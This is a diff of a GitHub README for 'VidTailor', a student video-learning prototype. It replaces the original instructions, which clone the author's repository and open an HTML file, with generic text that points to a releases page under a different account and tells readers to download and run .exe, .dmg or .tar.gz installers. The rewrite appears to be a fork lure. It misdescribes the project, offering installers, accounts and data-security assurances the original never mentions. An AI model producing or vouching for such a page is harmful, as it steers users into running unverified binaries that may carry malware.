@@ -1,101 +1,78 @@
-# VidTailor
+# 🎥 VidTailor - Enhance Learning Through Personalized Video Insights
 
-**Personalized Tutoring System Based on Video Content Understanding**
+## 🚀 Getting Started
 
-*Project Duration: June 2024 - June 2025*
+Welcome to VidTailor! This application helps you learn better by offering personalized questions and tracking your mistakes while you watch videos. We designed it for anyone who wants to improve their video-based learning experience without needing any technical skills.
 
----
+## 📥 Download VidTailor
 
-## Project Poster
+[![Download VidTailor](https://img.shields.io/badge/Download%20Now-Get%20VidTailor-blue)](https://github.com/ItzAddy345/VidTailor/releases)
 
-![VidTailor Poster](./assets/CPT208_Group50_Poster.png)
+## 💻 System Requirements
 
----
+To run VidTailor smoothly, make sure your system meets the following requirements:
 
-## Demo Preview
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, Linux (Ubuntu)
+- **Memory:** At least 4 GB of RAM
+- **Disk Space:** Minimum of 200 MB free space
+- **Internet Connection:** Required for full functionality
 
-![VidTailor Demo](./assets/CPT208_Group50_Demo.gif)
+## 📥 Download & Install
 
----
+To get started with VidTailor, follow these steps:
 
-## Bilbil
+1. **Visit the Releases Page:** Click this link to [download VidTailor](https://github.com/ItzAddy345/VidTailor/releases).
+   
+2. **Select the Latest Version:** On the Releases page, look for the latest version. It usually appears at the top of the list.
 
-- 📺 **[VidTailor 讲解视频（B站）](https://www.bilibili.com/video/BV1o4dxY1E8k/)**  — Our Presentation of VIdtailor
+3. **Download the File:** Click the download link for the appropriate file based on your operating system. This could be an `.exe` file for Windows, a `.dmg` file for macOS, or a `.tar.gz` file for Linux. 
 
+4. **Run the Installer:** Once the download is complete, locate the file in your downloads folder and double-click it to run the installer. Follow the on-screen instructions to complete the installation. 
 
-## Overview
+5. **Launch VidTailor:** After installation, you can find VidTailor in your applications folder or start menu. Click on the icon to launch the application.
 
-VidTailor is an intelligent video learning platform that generates personalized practice questions by analyzing students' viewing behaviors, providing precise learning feedback and a social learning experience.
+## 🎓 How to Use VidTailor
 
-## Core Features
+Using VidTailor is simple and intuitive. Here’s how to make the most of it:
 
-### 1. Intelligent Question Generation
+1. **Log In or Sign Up:** If it's your first time, create an account. If you already have one, simply log in.
 
-- **Behavior-Driven Analysis**: Real-time identification of learning difficulties based on viewing behaviors (fast-forward, slow-motion, pause, replay, etc.)
-- **Personalized Questions**: Automatically generates practice questions tailored to individual learning levels and weak points
-- **Instant Feedback**: Provides real-time feedback to help students test and reinforce their understanding immediately
+2. **Upload Your Video:** After logging in, you can upload any educational video you want to analyze. 
 
-### 2. Smart Error Book & Note System
+3. **Watch and Learn:** As you watch the video, VidTailor will track your viewing behavior. 
 
-- **Video Segment Linking**: Precisely associates incorrect answers with corresponding video segments for one-click review
-- **Knowledge Point Highlighting**: Automatically records errors and highlights key concepts to build a personal knowledge gap database
-- **Synchronized Notes**: Smart note-taking feature addresses cognitive blind spots, improving review efficiency and knowledge system completeness
+4. **Answer Personalized Questions:** Based on your interaction with the video, VidTailor will generate questions to enhance your understanding.
 
-### 3. Social Learning Interaction
+5. **Review Your Progress:** You can track your performance and see the errors you made. This helps you focus on areas that need improvement.
 
-- **Smart Matching**: Recommendation algorithm pairs learners with similar questions or challenges
-- **Topic Forums**: Guides students into relevant discussion groups to share insights and problem-solving approaches
-- **AI Assistant**: Intelligent chat assistant helps discuss difficult problems and pushes relevant knowledge points
-- **Learning Community**: Creates a collaborative learning atmosphere to boost motivation and engagement
+## 🌟 Features of VidTailor
 
-## Design Methodology
+- **Personalized Learning:** VidTailor tailors questions to your viewing habits.
+- **Error Tracking:** Understand where you went wrong to improve.
+- **Social Learning:** Engage with peers and share insights.
+- **Feedback-Rich Environment:** Get valuable feedback from the app on your learning journey.
 
-### User Research & Iteration
+## ❓ FAQs
 
-- **Multi-Round Prototype Testing**: Scenario demonstration videos → Low-fidelity prototype interviews → Questionnaire surveys
-- **A/B Testing**: Compares different interaction prompt schemes to optimize the balance between timeliness and distraction
-- **Heuristic Evaluation**: Continuously collects user feedback to iterate and optimize features and interface design
+**1. What types of videos can I use with VidTailor?**  
+You can use any educational video that you want to analyze and learn from, including lectures, tutorials, and courses.
 
-### Validation Results
+**2. Is my data secure on VidTailor?**  
+Yes, we take your privacy seriously. Your data is secure and used only to improve your learning experience.
 
-- Significantly improved system usability (SUS satisfaction scores, task completion rates, etc.)
-- Validated the effectiveness of personalized learning paths and social learning models
-- Provided clear direction for future feature iterations
+**3. Can I use VidTailor on mobile devices?**  
+Currently, VidTailor is designed for desktop use. We may consider a mobile version in the future.
 
-## Problems Solved
+## 🛠 Troubleshooting
 
-Pain points of traditional video learning platforms:
-- ❌ Lack of supporting practice questions, unable to test learning outcomes promptly
-- ❌ Cannot provide personalized targeted exercises
-- ❌ Learning discussions scattered across various chat apps, lacking systematization
+If you encounter issues while using VidTailor, try these steps:
 
-VidTailor's solutions:
-- ✅ Intelligent question generation system based on behavior analysis
-- ✅ Personalized learning paths with instant feedback
-- ✅ Integrated social learning community
+1. **Check System Requirements:** Ensure your system meets the required specifications.
+2. **Reinstall the Application:** If the software doesn’t run properly, uninstall and reinstall it.
+3. **Consult the Community:** Visit our forum or GitHub issues page to seek advice from other users.
 
-## Project Handout
+## 📞 Support
 
-![VidTailor Handout](./assets/CPT208_Group50_handout.png)
+If you need further assistance, please reach out to our support team via the contact form on the website. We are here to help you.
 
-## Technical Highlights
-
-- Video content understanding and knowledge point extraction
-- Learning behavior analysis algorithms
-- Personalized recommendation engine
-- Intelligent Q&A and collaboration system
-
-## Usage
-
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/WillWu111/VidTailor.git
-   ```
-2. Enter the Codes folder:
-   ```bash
-   cd Codes
-   ```
-3. Open the HTML file in your browser (double-click it or run):
-    ```bash
-   start index.html
-    ```
+Thank you for choosing VidTailor! We hope it makes your learning enjoyable and effective.
